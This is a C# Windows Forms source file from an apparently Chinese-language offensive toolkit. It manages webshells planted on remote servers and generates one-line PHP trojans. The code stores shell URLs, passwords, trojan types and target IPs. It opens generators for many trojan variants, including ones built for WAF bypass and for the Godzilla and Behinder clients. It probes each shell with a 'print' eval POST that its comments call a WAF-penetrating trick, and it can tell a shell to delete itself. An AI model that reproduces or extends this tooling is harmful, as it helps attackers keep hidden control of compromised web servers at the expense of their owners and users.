using C2.Core;
using C2.Utils;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.Serialization.Formatters.Binary;
using System.Text;
using System.Windows.Forms;

namespace C2.Business.CastleBravo.WebShellTool
{
    public partial class WebShellManageForm : Form
    {
        public static ProxySetting Proxy { get; set; } = ProxySetting.Empty;
        List<WebShellTaskConfig> tasks = new List<WebShellTaskConfig>();
        readonly string configFFP = Path.Combine(Application.StartupPath, "Resources", "WebShellConfig", "config.db");
        public WebShellManageForm()
        {
            InitializeComponent();
        }

        private void AddShellMenu_Click(object sender, EventArgs e)
        {
            WebShellTaskConfig config = new AddWebShellForm().ShowDialog(ST.NowString());
            if (config == WebShellTaskConfig.Empty)
                return;

            LV.Items.Add(NewLVI(config));
            tasks.Add(config);

            SaveDB();
        }

        private void RefreshTasks()
        {
            tasks.Clear();
            foreach (ListViewItem lvi in LV.Items)
            {
                WebShellTaskConfig config = new WebShellTaskConfig(lvi.SubItems[0].Text,  // 创建时间
                                                                   lvi.SubItems[1].Text,  // 名称
                                                                   lvi.SubItems[2].Text,  // url
                                                                   lvi.SubItems[3].Text,  // 密码
                                                                   lvi.SubItems[4].Text,  // 木马类型
                                                                   lvi.SubItems[5].Text,  // 木马状态
                                                                   lvi.SubItems[6].Text,  // 客户端版本
                                                                   lvi.SubItems[7].Text); // 
                lvi.Tag = config; // 关联
                tasks.Add(config);// 数据库配置
            }

        }

        private void ClearAll()
        {
            tasks.Clear();
            RefreshLV();
            SaveDB();
        }

        private void SaveDB()
        {
            try
            {
                using (Stream stream = File.Open(configFFP, FileMode.Create))
                   new BinaryFormatter().Serialize(stream, tasks);
            }
            catch { }
        }

        private void WebShellManageForm_Load(object sender, EventArgs e)
        {
            LoadDB();
            RefreshLV();
        }



        private void LoadDB()
        {
            try
            {
                using (Stream stream = File.Open(configFFP, FileMode.Open))
                    tasks = new BinaryFormatter().Deserialize(stream) as List<WebShellTaskConfig>;
            }
            catch { }

        }

        public void RefreshLV()
        {
            LV.Items.Clear();  // 不能删表头的clear方法
            foreach (WebShellTaskConfig config in tasks)
                LV.Items.Add(NewLVI(config));
        }

        static bool isAlertnatingRows = true;
        private static ListViewItem NewLVI(WebShellTaskConfig config)
        {
            ListViewItem lvi = new ListViewItem(config.CreateTime);
            lvi.SubItems.Add(config.Remark);
            lvi.SubItems.Add(config.Url);
            lvi.SubItems.Add(config.Password);
            lvi.SubItems.Add(config.TrojanType);
            lvi.SubItems.Add(config.Status);
            lvi.SubItems.Add(config.ClientVersion);
            lvi.SubItems.Add(config.DatabaseConfig);
            lvi.SubItems.Add(config.IP);
            lvi.SubItems.Add(config.Country);

            // 指针关联
            lvi.Tag = config;
            // 设置间隔行背景色
            lvi.BackColor = isAlertnatingRows ? Color.FromArgb(255, 217, 225, 242) : Color.FromArgb(255, 208, 206, 206);
            isAlertnatingRows = !isAlertnatingRows;
            return lvi;
        }

        private void EnterToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.LV.SelectedItems.Count == 0)
                return;

            new WebShellDetailsForm(LV.SelectedItems[0].Tag as WebShellTaskConfig).ShowDialog();
        }

        private void RemoveToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem lvi in LV.SelectedItems)
                lvi.Remove();
            
            RefreshTasks();
            SaveDB();
        }

        private void EditToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.LV.SelectedItems.Count == 0)
                return;

            WebShellTaskConfig old = LV.SelectedItems[0].Tag as WebShellTaskConfig;
            WebShellTaskConfig cur = new AddWebShellForm().ShowDialog(old);

            if (cur == WebShellTaskConfig.Empty)
                return;

            LV.SelectedItems[0].Tag = cur;
            LV.SelectedItems[0].SubItems[1].Text = cur.Remark;         // 名称
            LV.SelectedItems[0].SubItems[2].Text = cur.Url; // url
            LV.SelectedItems[0].SubItems[3].Text = cur.Password;       // 密码
            LV.SelectedItems[0].SubItems[4].Text = cur.TrojanType;     // 木马类型
            LV.SelectedItems[0].SubItems[5].Text = cur.Status;         // 木马状态
            LV.SelectedItems[0].SubItems[6].Text = cur.ClientVersion;  // 客户端版本
            LV.SelectedItems[0].SubItems[7].Text = cur.DatabaseConfig; // 数据库配置
            LV.SelectedItems[0].SubItems[8].Text = cur.IP;             // 目标IP
            LV.SelectedItems[0].SubItems[9].Text = cur.Country;        // 归属地
            // 按道理不会出现索引越界
            tasks[tasks.IndexOf(old)] = cur;
            SaveDB();
        }
        private void LV_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            EditToolStripMenuItem_Click(sender, e);
        }

        private void CopyToolStripMenuItem_Click(object sender, EventArgs e)
        {
            // 复制当前的选中单元格到粘贴板
            if (this.LV.SelectedItems.Count == 0)
                return;

            ListViewItem lvi = this.LV.SelectedItems[0];
            // 没找到能复制指定单元格的方法, 先复制整行
            StringBuilder sb = new StringBuilder();
            sb.AppendLine(lvi.SubItems[0].Text)  // 按道理一个foreach搞定,但内部类型没找到合适的引用方法
              .AppendLine(lvi.SubItems[1].Text)
              .AppendLine(lvi.SubItems[2].Text)
              .AppendLine(lvi.SubItems[3].Text)
              .AppendLine(lvi.SubItems[4].Text)
              .AppendLine(lvi.SubItems[5].Text)
              .AppendLine(lvi.SubItems[6].Text)
              .AppendLine(lvi.SubItems[7].Text)
              .AppendLine(lvi.SubItems[8].Text)
              .AppendLine(lvi.SubItems[9].Text);

            FileUtil.TryClipboardSetText(sb.ToString());
        }

        private void PHPEvalToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new TrojanGeneratorForm("PHP通用型一句话Trojan").ShowDialog();
        }

        private void BypassToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new TrojanGeneratorForm("凯撒变种Trojan").ShowDialog();
        }

        private void 变体1ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new TrojanGeneratorForm("一句话Trojan_变种1").ShowDialog();
        }

        private void 变种2ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new TrojanGeneratorForm("一句话Trojan_变种2").ShowDialog();
        }

        private void 变种3ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new TrojanGeneratorForm("一句话Trojan_变种3").ShowDialog();
        }

        private void 变种4ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new TrojanGeneratorForm("一句话Trojan_变种4").ShowDialog();
        }

        private void 变种5ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new TrojanGeneratorForm("一句话Trojan_变种5").ShowDialog();
        }

        private void 变种6ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new TrojanGeneratorForm("一句话Trojan_变种6").ShowDialog();
        }

        private void 变种7ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new TrojanGeneratorForm("一句话Trojan_变种7").ShowDialog();
        }

        private void 变种8ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new TrojanGeneratorForm("一句话Trojan_变种8").ShowDialog();
        }

        private void 变种9ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new TrojanGeneratorForm("一句话Trojan_变种9").ShowDialog();
        }

        private void GodzillaToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new TrojanGeneratorForm("哥斯拉配套Trojan", true).ShowDialog();
        }

        private void BehinderToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new TrojanGeneratorForm("三代冰蝎配套Trojan").ShowDialog();
        }

        private void RefreshCurrentStatusMenuItem_Click(object sender, EventArgs e)
        {
            if (this.LV.SelectedItems.Count == 0)
                return;

            LV.SelectedItems[0].SubItems[5].Text = RefreshTaskStatus(LV.SelectedItems[0].Tag as WebShellTaskConfig); ;
            
            RefreshTasks();
            SaveDB();
        }

        private void RefreshAllStatusMenuItem_Click(object sender, EventArgs e)
        {
            RefreshAllTaskStatus();
        }

        private void RefreshAllTaskStatus(bool isSkipDead = false)
        {
            // 刷新前先强制清空
            foreach (ListViewItem lvi in LV.Items)
            {
                // 不启用跳过尸体, 全部清空
                if (!isSkipDead)
                {
                    lvi.SubItems[5].Text = string.Empty;
                    lvi.SubItems[8].Text = string.Empty;
                    lvi.SubItems[9].Text = string.Empty;
                    continue;
                }  
                // 启用跳过尸体, 只有死的才改变状态
                if (lvi.SubItems[5].Text == "×")
                {
                    lvi.SubItems[5].Text = string.Empty;
                    lvi.SubItems[8].Text = string.Empty;
                    lvi.SubItems[9].Text = string.Empty;
                }
                    
            }
                

            foreach (ListViewItem lvi in LV.Items)
            {
                // 启用跳过尸体, 遇到活人，跳过
                if (isSkipDead && lvi.SubItems[5].Text == "√")
                    continue;

                WebShellTaskConfig task = lvi.Tag as WebShellTaskConfig;
                lvi.SubItems[5].Text = RefreshTaskStatus(task);
                lvi.SubItems[8].Text = task.IP;
                lvi.SubItems[9].Text = task.Country;
                lvi.ListView.RedrawItems(lvi.Index, lvi.Index, false);
            }


            RefreshTasks();
            SaveDB();
        }

        private string RefreshTaskStatus(WebShellTaskConfig task)
        {
            string status = "×";

            using (GuarderUtil.WaitCursor) 
            {
                // 我总结的print穿透WAF大法
                if (PostPrint(NetUtil.FormatUrl(task.Url), task.Password))
                {
                    RefreshIPAddress(task);  // D洞存在的情况下才更新IP
                    return "√";
                }    
            }
            return status;
        }

        private void RefreshIPAddress(WebShellTaskConfig task)
        {
            task.IP = NetUtil.GetHostAddresses(task.Url);
            task.Country = NetUtil.IPQuery_126Net(task.IP);
        }

        private bool PostPrint(string url, string password)
        {
            try
            {   
                string seed = RandomUtil.RandomInt(31415000, 31415926).ToString();
                string result = WebClientEx.Post(url, string.Format("{0}=print({1});", password, seed), 1500, Proxy);
                return result.Contains(seed);
            } catch { return false; }
            
        }

        private void AddAllShellMenu_Click(object sender, EventArgs e)
        {
            AddAllWebShellForm dialog = new AddAllWebShellForm();
            if (dialog.ShowDialog() != DialogResult.OK)
                return;

            foreach(WebShellTaskConfig task in dialog.Tasks)
            {
                if (task == WebShellTaskConfig.Empty)
                    continue;

                LV.Items.Add(NewLVI(task));
                tasks.Add(task);
            }

            SaveDB();
        }

        private void ClearAllToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ClearAll();
        }

        private void SuscideMenuItem_Click(object sender, EventArgs e)
        {
            if (this.LV.SelectedItems.Count == 0)
                return;

            WebShellTaskConfig config = LV.SelectedItems[0].Tag as WebShellTaskConfig;
            WebShellClient client = new WebShellClient(config.Url, config.Password, config.ClientVersion);
            client.Suscide();
            RemoveToolStripMenuItem_Click(sender, e);
        }

        private void 变种10ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new TrojanGeneratorForm("一句话Trojan_变种10").ShowDialog();
        }

        private void 变种11LandGreyToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new TrojanGeneratorForm("一句话Trojan_变种11").ShowDialog();
        }

        private void ProxyMenu_Click(object sender, EventArgs e)
        {
            Proxy = new ProxySettingForm(Proxy).ShowDialog();
        }

        private void SaveResultsMenuItem_Click(object sender, EventArgs e)
        {
            SaveFileDialog dialog = new SaveFileDialog();
            dialog.Filter = "文本文件|*.txt";
            dialog.FileName = "D洞管理" + DateTime.Now.ToString("yyyyMMddHHmm") + ".txt";

            if (dialog.ShowDialog() != DialogResult.OK)
                return;

            using (GuarderUtil.WaitCursor)
                SaveResultToLocal(dialog.FileName);
        }

        private void SaveResultToLocal(string path)
        {
            StreamWriter sw = new StreamWriter(path, true); 
            try
            {
                List<string> tmpLists = new List<string>();
                foreach (ListViewItem lvi in LV.Items)
                {
                    tmpLists.Clear();
                    for (int i = 0; i < lvi.SubItems.Count; i++)
                        tmpLists.Add(lvi.SubItems[i].Text.Replace("\r\n"," "));
                    sw.WriteLine(string.Join("\t", tmpLists.ToArray()));
                }
            }
            catch { }
            finally
            {
                if (sw != null)
                    sw.Close();
            }
        }

        private void RefreshAllDeadMenu_Click(object sender, EventArgs e)
        {
            RefreshAllTaskStatus(true);
        }
    }
}
